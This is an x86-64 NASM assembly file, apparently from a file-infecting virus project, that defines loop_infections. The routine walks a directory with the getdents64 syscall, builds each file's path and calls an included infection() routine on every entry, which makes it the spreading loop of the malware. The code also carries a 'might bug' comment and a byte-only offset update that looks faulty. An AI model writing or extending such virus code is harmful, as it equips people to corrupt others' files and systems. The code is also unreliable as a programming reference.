
%include "define.asm"
%include "infection.asm"
%include "ft_strcpy.asm"
%include "ft_strcat.asm"

%define fd 			rbp-0x4
%define nread 			rbp-0x8
%define bpos 			rbp-0x0c
%define buf 			rbp-0x40c
%define ptr 			rbp-0x414
%define filename		rbp-0x1414
%define pathsize		rbp-0x1418
%define path			rbp-0x1420




;	global loop_infections

	segment .text

;           struct linux_dirent64 {
;               ino64_t        d_ino;    /* 64-bit inode number */
;               off64_t        d_off;    /* 64-bit offset to next structure */
;               unsigned short d_reclen; /* Size of this dirent */
;               unsigned char  d_type;   /* File type */
;               char           d_name[]; /* Filename (null-terminated) */
;           };


; sys_getdents64


; int fd
; int nread
; int bpos
; char buf[1024]
; struct linux_dirent64 *
; char filename[256]
; int	pathsize
; char  *path

loop_infections:
	push rbp
	mov rbp, rsp
	sub rsp, 5152 ; 4 + 4 + 4 + 1024 + 8 + 4096 + 4 + 8 
	mov dword [fd], edi
	mov dword [nread], 0
	mov [path], rsi
; set the filename buffer with rsi
	lea rdi, [filename]
	; rsi already set
	call ft_strcpy

	mov rdi, [path]
	call ft_strlen
	mov dword [pathsize], eax

loop1:

	mov rax, SYS_GETDENTS64
	mov rdi, [fd]
	lea rsi, [buf]
	mov rdx, 0x400
	syscall  ; getdents64(int fd, char *buf, size_t BUFFSIZE);
	mov dword [nread], eax
	cmp rax, -1
	jl loop_bad_end
	cmp rax, 0
	jz loop_end
	mov dword [bpos], 0
loop2:
	mov ebx, dword [bpos]
	cmp ebx, dword [nread]
	jge loop1
	lea rcx, [buf + rbx] ; might bug
	mov [ptr], rcx

	mov esi, [pathsize]
	lea rdi, [filename]
	add rdi, rsi
	mov byte [rdi], 0x0	; put \0 at the end of the filename

	mov rsi, [ptr]
	add rsi, 0x13
	lea rdi, [filename]
	call ft_strcat		; ft_strcat(char *filepath, char *name)
	lea rdi, [filename]
	call infection		; infection(char *filename)

;       mov rsi, [ptr]
;	add rsi, 0x13
;	mov rdi, 1
;	mov rdx, 3
;	mov rax, SYS_WRITE
;	syscall

	mov rax, [ptr]
	add rax, 0x10
	mov ebx, [bpos]
	add bl, byte [rax]
	mov dword [bpos], ebx
	jmp loop2

loop_bad_end:
	mov rax, -1
loop_end:
	leave
	ret

